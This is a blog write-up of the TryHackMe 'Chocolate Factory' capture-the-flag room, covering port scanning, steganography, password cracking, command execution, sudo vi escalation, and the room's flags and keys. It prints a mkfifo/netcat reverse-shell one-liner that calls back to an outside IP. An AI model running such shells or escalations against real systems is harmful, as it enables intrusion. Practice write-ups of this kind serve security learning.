# TRYHACKME : CHOCOLATE FACTORY WRITEUP

Chocolate Factor is an easy difficult room based on Willy Wonka’s Chocolate Factory on tryhackme.

---

### TRYHACKME : CHOCOLATE FACTORY WRITEUP

![](https://cdn-images-1.medium.com/max/800/0*J6j_q3iGrZq8zGuO)

Chocolate Factor is an easy difficult room based on Willy Wonka’s Chocolate Factory on tryhackme.

starting with a nmap scan:-

*21/tcp open ftp  
22/tcp open ssh  
80/tcp open http  
100/tcp open newacct  
101/tcp open hostname  
102/tcp open iso-tsap  
103/tcp open gppitnp  
104/tcp open acr-nema  
105/tcp open csnet-ns  
106/tcp open pop3pw  
107/tcp open rtelnet  
108/tcp open snagas  
109/tcp open pop2  
110/tcp open pop3  
111/tcp open rpcbind  
112/tcp open mcidas  
113/tcp open ident  
114/tcp open audionews  
115/tcp open sftp  
116/tcp open ansanotify  
117/tcp open uucp-path  
118/tcp open sqlserv  
119/tcp open nntp  
120/tcp open cfdptkt  
121/tcp open erpc  
122/tcp open smakynet  
123/tcp open ntp  
124/tcp open ansatrader  
125/tcp open locus-map*

all of these ports were running, every other port had something related to willy wonka showing in nmap scan other than port 113.

![](https://cdn-images-1.medium.com/max/800/1*SzY2nUjXyc5OW3MMXypPaw.png)

we visist the link in browser, change localhost to the target ip and it downloads an executable.

viewing the strings, we get the key

![](https://cdn-images-1.medium.com/max/800/1*l9ums6cA9c8Y3QZaBh8UeA.png)

now, ftp also had anon access enabled,

![](https://cdn-images-1.medium.com/max/800/1*zMcpIr8qSoipR_yUt4lRXA.png)

we can use steghide to check if there is hidden data in the img,

![](https://cdn-images-1.medium.com/max/800/1*cLV91HTtAnWo80nIOdhyzw.png)![](https://cdn-images-1.medium.com/max/800/1*4dev4ZSQBIFBKQTGQSPpuA.png)

seems like we get a base64 encoded file.

![](https://cdn-images-1.medium.com/max/800/1*E2GNlRxZgjG_QRik15qpFA.png)

this looks like an /etc/shadow file, we can see the encrypted password for the user charlie

![](https://cdn-images-1.medium.com/max/800/1*swzQwN37wxYWI_CF_QwLrA.png)

using john, we get the password for charlie to be cn7824

we cant use this password for ssh, but there is a login page on the http port.

![](https://cdn-images-1.medium.com/max/800/1*I9O_VVMgfzL-VxvCbHdJPQ.png)

andddd, here we have command execution,

we can use this to get a shell.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.49.117.182 1235 >/tmp/f

![](https://cdn-images-1.medium.com/max/800/1*qRB_IFvl9FvdZ5mKbDd8Xg.png)

and we find a ssh key in home directory of charlie

![](https://cdn-images-1.medium.com/max/800/1*fhCDkjskdGKhLQGBt80THA.png)![](https://cdn-images-1.medium.com/max/800/1*XtVAsfQ3EUnkvl7la3DZww.png)

user.txt :- flag{cd5509042371b34e4826e4838b522d2e}

now for the privesc part, doing sudo -l we can see this

![](https://cdn-images-1.medium.com/max/800/1*iH3vMFmDdx-PKKJxsgRV7w.png)

using gtfobins, privesc is possible

[**vi | GTFOBins**  
*Living off the land using "vi".*gtfobins.org](https://gtfobins.org/gtfobins/vi/#shell "https://gtfobins.org/gtfobins/vi/#shell")

![](https://cdn-images-1.medium.com/max/800/1*pEIhEo_lGhHTZ-H7NXvE9Q.png)

we see a root.py in the root directory, i copied the python code and pasted it in my machine,

after running it asks for key, we can use the key we found earlier here

- VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

![](https://cdn-images-1.medium.com/max/800/1*NEHXxuNaHbIs8XXlhr90vg.png)

and we get the root flag.

![](https://cdn-images-1.medium.com/max/800/1*5ryDzbLinCeH-2aL4k5xJg.png)

root flag:- flag{cec59161d338fef787fcb4e296b42124}

By [Lightningfst](https://medium.com/@lightningfst8) on [July 2, 2026](https://medium.com/p/74f8bf7bc097).

[Canonical link](https://medium.com/@lightningfst8/tryhackme-chocolate-factory-writeup-74f8bf7bc097)

Exported from [Medium](https://medium.com) on August 8, 2026.
